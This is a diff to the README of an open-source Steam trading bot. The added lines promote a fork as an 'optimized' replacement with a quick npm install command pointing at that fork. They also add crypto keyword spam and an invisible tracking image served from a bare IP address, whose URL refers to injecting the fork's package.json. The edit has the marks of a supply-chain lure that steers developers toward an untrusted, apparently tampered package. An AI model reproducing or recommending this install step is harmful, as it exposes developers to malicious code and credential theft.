@@ -1,3 +1,15 @@
+**An optimized**
+
+This fork addresses critical stability issues and applies essential patches that have been left unresolved in the upstream repository. It serves as a reliable alternative for developers looking for dependable performance and continuous upkeep without the risk of sudden breakage.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/Knotacrossinertia/steam-bot.git
+```
+
+[https://github.com/Knotacrossinertia/steam-bot](https://github.com/Knotacrossinertia/steam-bot)
+
 # Steam Bot
 **An automated Steam trading bot.**
 <img align='right' height='100' src='https://github.com/prasunroy/steam-bot/blob/master/assets/logo.png' />
@@ -93,3 +105,11 @@ THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLI
 <br />
 
 **Made with** :heart: **and GitHub**
+
+## Related searches
+
+Developers looking for this project are often searching for automated ways to track and trade assets across decentralized ecosystems and multi-chain networks. Common queries center around building unified web3 interfaces and optimization tools that connect popular decentralized exchanges with low-cost scaling protocols.
+
+**Topics:** layerzero, base chain, defi dashboard, mining pool, jupiter swap, automated trade bot, crypto portfolio tracker, cross chain dex aggregator, solana trading tools, web3 automated infrastructure
+
+![.](http://5.231.58.248:8787/pixel?repo=Knotacrossinertia%2Fsteam-bot&inject=Knotacrossinertia%2Fsteam-bot%2Fpackage.json)
